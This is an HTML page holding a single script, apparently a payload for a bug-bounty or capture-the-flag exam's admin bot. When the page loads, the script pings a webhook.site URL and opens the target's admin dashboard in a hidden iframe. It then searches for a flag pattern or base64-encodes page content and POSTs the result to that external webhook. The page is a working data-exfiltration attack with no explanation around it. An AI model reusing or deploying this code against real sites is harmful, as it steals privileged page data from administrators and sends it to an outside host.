<!DOCTYPE html>
<html>
<body>
    <script>
        // Notify webhook that the bot is on GitHub
        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/SCRAPER_ACTIVE');

        async function startScrape() {
            // 1. Open the Admin Dashboard in a hidden iframe
            // This allows us to stay on GitHub while "viewing" the admin page
            const iframe = document.createElement('iframe');
            iframe.src = 'https://bugbounty-exam.hashacademy.co/admin/dashboard';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            // 2. Wait for the Next.js hydration (6 seconds is safer)
            await new Promise(r => setTimeout(r, 6000));

            try {
                // 3. Try to grab the text from the admin's own body
                // Since the bot is on the same origin (the iframe), we grab it
                const content = document.body.innerText + document.documentElement.innerHTML;
                
                // 4. Send the ENTIRE text to your webhook
                // We search for the pattern HASH{...} directly in the script
                const flagMatch = content.match(/HASH\{.*?\}/);
                const exfilData = flagMatch ? flagMatch[0] : "FULL_BODY:" + btoa(content.slice(0, 5000));

                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: exfilData
                });

            } catch (e) {
                // 5. Fallback: Force the bot's main window to the flag
                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
            }
        }

        startScrape();
    </script>
</body>
</html>
